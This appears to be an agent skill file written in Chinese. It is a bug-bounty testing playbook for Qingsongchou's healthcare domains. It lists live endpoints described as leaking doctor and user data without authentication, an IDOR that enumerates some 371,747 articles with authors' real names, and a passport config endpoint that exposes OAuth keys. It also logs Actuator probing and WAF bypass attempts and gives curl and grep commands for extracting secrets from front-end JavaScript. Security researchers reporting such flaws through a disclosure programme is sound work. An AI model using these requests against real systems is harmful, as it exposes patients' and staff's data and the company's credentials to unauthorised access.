---
name: qssrc-testing-patterns
description: 轻松筹QSSRC SRC渗透测试模式 - API未授权/IDOR/Passport认证/Actuator/WAF绕过
category: penetration-testing-learning
tags: [src, qssrc, healthcare, api, idor, passport]
---

# QSSRC轻松筹SRC测试模式 (2026-05-12)

## 目标范围
- *.qschou.com (轻松筹主站)
- *.qsebao.com (轻松保)
- *.duoerehospital.com (朵尔互联网医院)
- *.qshealth.com (轻松健康)

## 技术栈指纹
- 前端: Vue.js SPA + Vite + VConsole调试工具
- 后端: Spring Boot (Actuator) + OpenResty/nginx
- WAF: 阿里云WAF (acw_tc cookie, 405:2657拦截)
- CDN: 阿里云OSS, TencentCOS, CTYUN, KS-CLOUD
- 认证: 自研Passport系统, Qsc-Token + Platform header
- 埋点: Sensors数据分析 (sensors-data.qingsongjkkj.com)
- 支付: centerapi.qsjktech.com/centerpay

## 关键API域名
| 域名 | 用途 | 防护 |
|------|------|------|
| api-health.duoerehospital.com | 健康API(主) | 阿里云WAF |
| api-med.duoerehospital.com | 医疗API | 阿里云WAF |
| api-med.qshealth.com | 健康API | 阿里云WAF |
| api-med.qingsongjkkj.com | 营销API | 阿里云WAF |
| centerapi.duoerehospital.com | Passport认证 | 阿里云WAF |
| centerapi.qschou.com | 中心API | 阿里云WAF |
| centerapi.qsjktech.com | 支付+Session | 阿里云WAF |
| pp.duoerehospital.com | Passport域名配置 | 无WAF |
| consult.qshealth.com | 在线客服 | - |
| med4.qshealth.com | 投票系统 | - |

## 已确认高价值端点(无需认证返回数据)

### 数据泄露端点
```
POST api-health.duoerehospital.com/health/center/home → 健康中心列表
POST api-health.duoerehospital.com/health/center/list → 健康中心详细
POST api-health.duoerehospital.com/banner/home → 轮播图+创建人
POST api-health.duoerehospital.com/health/doctor/recommend → 医生姓名+医院+科室+定价
POST api-health.duoerehospital.com/product/recommend → 商品+价格
POST api-health.duoerehospital.com/cms/topic/query → 话题+浏览量
POST api-health.duoerehospital.com/cms/topic/detail → 话题详情
POST api-health.duoerehospital.com/cms/content/detail → 内容+作者
POST api-health.duoerehospital.com/cms/fragment/user/fragment → 用户碎片
```

### IDOR端点(自增ID可枚举)
```
POST api-med.qingsongjkkj.com/marketing/client/article/get {"id":枚举}
  → 37万篇文章完整content+author实名+visitCount
POST api-med.qingsongjkkj.com/marketing/client/article/page {"size":N,"current":N}
  → 分页列表(确认总量371747)
```

### 配置泄露端点
```
POST pp.duoerehospital.com/passport/domain {"company":"任意值","keys":["passport_web","passport_api"],"theme":"bx"}
  → 内部API域名 + OAuth密钥(alipay/wechat) + 8个内部hosts
POST pp.qsjktech.com/passport/domain → 同上
POST pp.qshealth.com/passport/domain → 同上
POST pp.qsebao.com/passport/domain → 同上
```

### Actuator端点(暴露目录，env被WAF拦截)
```
GET api-med.duoerehospital.com/actuator → 端点目录(200)
GET api-med.duoerehospital.com/actuator/health → {"status":"UP"}
GET api-med.duoerehospital.com/actuator/env → 405:2657(WAF拦截，确认存在)
GET api-med.duoerehospital.com/actuator/heapdump → 405:2657(WAF拦截)
```

## 认证机制
- Token: Qsc-Token header (JWT格式)
- 客户端: Platform header (qsc_h5/1.2.3)
- 错误码: code=16(token失效), code=3(缺header), code=2(404)
- Passport端点: /passport/user/info(需Token), /v1/token/verify, /passport/logout

## WAF绕过尝试记录
- /actuator/env URL编码: /actuator/%65nv → 仍405
- /actuator/env 大小写: /actuator/ENV → 仍405
- /actuator/env 参数污染: /actuator/env?_=1 → 仍405
- 结论: 阿里云WAF对actuator/env拦截有效

## 前端JS分析要点
```
# 下载主JS
curl -sk "https://tydajiankang-cdn.qshealth.com/duoerehospital/static/js/app.xxx.js" > app.js

# 提取API端点
strings app.js | grep -oP '"/[a-zA-Z0-9/_-]{4,80}"' | sort -u

# 提取OAuth密钥
strings app.js | grep -iE 'appid|oauthKey|signKey|appKey|client_id'

# 提取内部域名
strings app.js | grep -oP 'https://[a-z-]+\.(duoerehospital|qsebao|qshealth|qsjktech|qingsongjkkj)\.com[^"]*'
```

## SRC提交要点
- 漏洞盒子格式: 标题/域名/类型/等级/简述/复现步骤/修复建议
- 纯文本不用HTML
- 标题格式: "厂商-系统名，存在XX漏洞"
- 复现步骤用curl命令+返回结果
- QSSRC收取标准: 高危及以上才收非域名范围内漏洞
